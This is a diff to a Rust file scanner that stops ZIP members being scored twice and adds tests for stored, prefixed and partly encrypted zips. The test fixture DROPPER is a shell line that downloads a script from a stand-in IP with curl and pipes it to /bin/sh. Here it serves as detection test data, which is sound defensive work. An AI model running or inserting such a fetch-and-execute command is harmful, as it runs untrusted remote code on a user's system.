@@ -87,6 +87,20 @@ pub(super) fn inspection_with<'c>(
     ctx.zip_cache.get_or_init(|| inspect(ctx, limits)).as_ref()
 }
 
+/// True for a real file that starts with a ZIP local header and whose zip
+/// was read with no gaps: [`ZipMemberRule`] scores its content, so the raw
+/// content rules skip it rather than count a stored member twice (§6.2,
+/// #140). A prefixed zip keeps its raw scan, as its leading text may run.
+/// Embedded zips are decided by their container (`package::scan_member`).
+pub(super) fn scored_through_members(ctx: &ScanContext) -> bool {
+    ctx.is_file_backed()
+        && ctx
+            .content
+            .as_deref()
+            .is_some_and(|c| c.starts_with(b"PK\x03\x04"))
+        && inspection(ctx).is_some_and(|read| read.gaps.is_empty())
+}
+
 fn inspect(ctx: &ScanContext, limits: &ZipLimits) -> Option<ZipInspection> {
     let content = ctx.content.as_deref()?;
     if ctx.truncated || is_zip(ctx) != Some(true) || inside_app_bundle(ctx) {
@@ -251,8 +265,10 @@ mod tests {
     use crate::macho::tests_support::synth_macho_64_full_with_cds_and_cms;
     use crate::macho::{CS_ADHOC, CS_LINKER_SIGNED};
     use crate::model::Recommendation;
+    use crate::model::ScanResult;
     use crate::rules::{default_ruleset, UninspectedContainerRule};
-    use crate::zip::tests_support::{plain, Spec};
+    use crate::test_support::write_temp_file;
+    use crate::zip::tests_support::{build, plain, Layout, Spec};
 
     const DROPPER: &[u8] = b"#!/bin/sh\ncurl -fsSL http://198.51.100.9/x.sh | /bin/sh\n";
 
@@ -270,6 +286,53 @@ mod tests {
 
     fn container_signal(ctx: &ScanContext) -> Option<MatchedSignal> {
         UninspectedContainerRule.evaluate(ctx).unwrap()
+    }
+
+    /// `zip` scanned as a real file with the default ruleset.
+    fn scan_file(zip: &[u8]) -> ScanResult {
+        let path = write_temp_file("zip-member", zip);
+        let result = scan_context(&ScanContext::load(&path), &default_ruleset());
+        std::fs::remove_file(&path).unwrap();
+        result
+    }
+
+    fn fired(result: &ScanResult, id: &str) -> bool {
+        result.signals.iter().any(|s| s.id == id)
+    }
+
+    #[test]
+    fn a_stored_member_is_scored_once_as_a_deflated_one_is() {
+        let stored = scan_file(&plain(&[Spec::stored("run.sh", DROPPER)]));
+        let deflated = scan_file(&plain(&[Spec::deflated("run.sh", DROPPER)]));
+        assert!(fired(&stored, "zip-member-suspicious"));
+        assert!(
+            !fired(&stored, "suspicious-strings"),
+            "{:?}",
+            stored.signals
+        );
+        assert_eq!(stored.score, deflated.score);
+    }
+
+    #[test]
+    fn a_prefixed_zip_keeps_its_raw_scan() {
+        let zip = build(
+            &[Spec::stored("readme.txt", b"hello")],
+            &Layout {
+                prefix: DROPPER.to_vec(),
+                ..Layout::default()
+            },
+        );
+        assert!(fired(&scan_file(&zip), "suspicious-strings"));
+    }
+
+    #[test]
+    fn a_zip_read_with_gaps_keeps_its_raw_scan() {
+        let mut enc = Spec::stored("secret.txt", b"x");
+        enc.flags = 1;
+        enc.local_flags = 1;
+        let zip = plain(&[Spec::stored("run.sh", DROPPER), enc]);
+        let result = scan_file(&zip);
+        assert!(fired(&result, "suspicious-strings"), "{:?}", result.signals);
     }
 
     #[test]
